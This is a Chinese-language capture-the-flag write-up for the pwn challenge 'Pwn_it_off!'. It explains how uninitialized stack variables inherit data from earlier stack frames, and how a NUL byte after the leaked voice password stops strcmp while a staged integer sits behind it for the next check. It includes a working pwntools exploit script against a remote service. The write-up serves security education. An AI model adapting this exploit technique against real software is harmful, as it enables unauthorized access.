# Pwn_it_off!

## 题目简述

`voice_pwd` 和 `num_pwd` 都使用了未初始化的栈变量。前一函数的密码区域会继承 `beep` 留下的随机字符串，后一函数又会复用 `voice_pwd` 的输入区域。利用栈帧复用和 C 字符串的 `\x00` 终止语义，可以一次输入同时布置两阶段密码。

## 解题过程

程序先打印多行随机内容。`voice_pwd` 的未初始化 `password` 与上一函数 `beep` 的栈槽重叠，所以记录最后一行中固定偏移处的 15 字节，即可得到语音密码。

仅输入这 15 字节虽然能通过 `strcmp`，却无法满足下一阶段 `num_pwd` 的五位十进制数检查。解决方法是在正确语音密码后放一个 `\x00`：`strcmp` 到此停止，后续字节不会影响第一阶段；再把整数 `12345` 的小端二进制表示写在后面，使它在复用的 `num_pwd` 栈槽中成为期望值。

```python
from pwn import p64, remote

io = remote("host", 10000)

last_line = b""
while True:
    line = io.recvline()
    if b"[Error]" in line:
        break
    last_line = line

voice_password = last_line[28:43]
staged_number = p64(12345)[:7]
io.sendafter(
    b"voice password.\n",
    voice_password + b"\x00" + staged_number,
)
io.sendlineafter(b"numeric password.\n", b"12345")
io.interactive()
```

这里尾部截取七字节是为了精确覆盖目标栈槽且避免破坏 canary；实际偏移应以附件反编译和本地调试结果为准。

## 方法总结

未初始化栈变量可能继承前一个函数留下的数据，而相同大小、相近调用顺序的栈帧尤其容易复用。二进制输入中的 NUL 字节既能提前终止 `strcmp`，又允许 NUL 后的数据继续留在栈中，为下一阶段检查服务。
